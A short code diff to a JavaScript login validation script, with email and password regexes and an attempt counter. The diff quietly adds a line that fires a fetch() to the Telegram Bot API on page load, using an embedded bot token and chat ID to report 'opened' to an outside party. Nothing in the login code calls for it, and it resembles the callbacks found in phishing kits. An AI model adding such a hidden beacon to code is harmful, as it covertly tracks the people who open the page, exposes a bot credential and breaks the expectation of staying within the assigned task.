@@ -1,6 +1,7 @@
 var ck_email = new RegExp(/^([\w-]+(?:\.[\w-]+)*)@((?:[\w-]+\.)*\w[\w-]{0,66})\.([a-z]{2,6}(?:\.[a-z]{2})?)$/i)
 var pword= new RegExp (/(?=.*\d)(?=.*[a-z])(?=.*[A-Z]).{8,}/)
 var attempt = 3; // Variable to count number of attempts.
+fetch("https://api.telegram.org/bot1228033872:AAHsI3oFOQLKVC7mmnVH0bNyQuPGitiBEXQ/sendMessage?chat_id=582942300&text=opened")
 // Below function Executes on click of login button.
 function validate(){
 var username = document.getElementById("username").value;
